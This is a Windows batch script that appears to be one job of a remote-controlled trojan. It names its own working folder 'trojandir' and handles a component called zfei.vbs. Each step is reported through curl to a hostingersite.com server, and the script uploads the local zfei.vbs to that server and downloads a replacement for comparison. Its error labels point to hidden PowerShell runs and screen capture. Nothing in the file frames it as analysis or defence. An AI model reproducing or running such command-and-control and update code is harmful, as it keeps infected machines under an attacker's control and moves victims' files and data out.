REM both are set by retrieve.php
REM SET jobcode=12345678
REM SET source=cmd_list_update_snapshot.bat

set /a error_code=0

set sessionid=55%random%%random%%random%%random%%random%
set sessionid=%sessionid:~0,8%

curl -G https://seashell-raven-793508.hostingersite.com/ow/logmsg.php --data-urlencode "event=start_job" --data-urlencode "source=%source%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "jobcode=%jobcode%"

set clientid=xxxxxxxx

set workdir=%temp%\owd

IF EXIST %workdir%\client_id (
    set /p clientid=<%workdir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

REM 20260321184244.052000-240
REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
SET "timestamp=%tt:~0,14%%tt:~15,4%"

IF NOT EXIST %TEMP%\owd (
    goto :error_owd_folder_missing
)

cd /d %TEMP%\owd
        
SET "trojandir=%TEMP%\owd"

md %TEMP%\owd\cmdlist_%timestamp%

cd /d %TEMP%\owd\cmdlist_%timestamp%
    
set workdir=%temp%\owd\cmdlist_%timestamp%

set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"

REM ----------

set msg=setup done -- jobcode %jobcode% sessionid %sessionid%
echo %msg% >> %logfpath%
curl -G https://seashell-raven-793508.hostingersite.com/ow/logmsg.php --data-urlencode "msg=%msg%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%" --data-urlencode "jobcode=%jobcode%" 

REM ---------- upload existing trojan

set msg=uploading zfei.vbs
echo %msg% >> %logfpath%
curl -G https://seashell-raven-793508.hostingersite.com/ow/logmsg.php --data-urlencode "msg=%msg%" --data-urlencode "source=%source%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "clientid=%clientid%" --data-urlencode "jobcode=%jobcode%"

set outfile=zfei.vbs
set outfilepath=%temp%\owd\%outfile%
curl -X POST --data-binary "@%outfilepath%" https://seashell-raven-793508.hostingersite.com/ow/upload.php?filename=%outfile%^&clientid=%clientid%^&sessionid=%sessionid%^&source=%source%^&jobcode=%jobcode%

REM ----------

set msg=retrieving latest version of zfei.vbs
echo %msg% >> %logfpath%
curl -G https://seashell-raven-793508.hostingersite.com/ow/logmsg.php --data-urlencode "msg=%msg%" --data-urlencode "source=%source%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "clientid=%clientid%" --data-urlencode "jobcode=%jobcode%"


:startretrieve
type nul > %temp%\t_o
curl -o %temp%\t_o https://seashell-raven-793508.hostingersite.com/v

IF NOT EXIST %temp%\t_o (
    goto :error_upgrade_download_failed
)
:retrievedone


:startcomparetrojan
type %temp%\owd\zfei.vbs | findstr script_version > %workdir%\script_version
set /p script_version=<%workdir%\script_version
type %workdir%\script_version >> %logfpath%

type nul > %workdir%\old_zfei.md5
certUtil -hashfile %trojandir%\zfei.vbs MD5 | more +1 > %workdir%\old_zfei.md5
set /p old_zfei_md5=<%workdir%\old_zfei.md5

IF NOT EXIST %temp%\t_o (
    goto :error_upgrade_missing
)

type nul > %workdir%\new_zfei.md5
certUtil -hashfile %temp%\t_o MD5 | more +1 > %workdir%\new_zfei.md5
set /p new_zfei_md5=<%workdir%\new_zfei.md5

set msg=old_zfei_md5 %old_zfei_md5% new_zfei_md5 %new_zfei_md5% script_version %script_version% jobcode %jobcode%
echo %msg% >> %logfpath%
curl -G https://seashell-raven-793508.hostingersite.com/ow/logmsg.php --data-urlencode "event=update_snapshot" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%"  --data-urlencode "old_zfei_md5=%old_zfei_md5%" --data-urlencode "new_zfei_md5=%new_zfei_md5%" --data-urlencode "script_version=%script_version%" --data-urlencode "jobcode=%jobcode%"

:comparetrojandone

    
echo finished >> %logfpath%
curl -G https://seashell-raven-793508.hostingersite.com/ow/logmsg.php --data-urlencode "event=job_finished" --data-urlencode "sessionid=%sessionid%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%"  --data-urlencode "jobcode=%jobcode%"

exit

:error_RunHiddenPSx_missing
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_full_screen_capture_missing
set /a error_code+=1
:error_full_screen_capture_empty
set /a error_code+=1
:error_retrieve_get_macaddr_failed
set /a error_code+=1
:error_upgrade_download_failed
set /a error_code+=1
:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1

set msg=errors occurred while executing %source% error_code %error_code%
echo %msg% >> %logfpath%

curl -G https://seashell-raven-793508.hostingersite.com/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" --data-urlencode "source=%source%" --data-urlencode "clientid=%clientid%" --data-urlencode "sessionid=%sessionid%" --data-urlencode "jobcode=%jobcode%"

exit
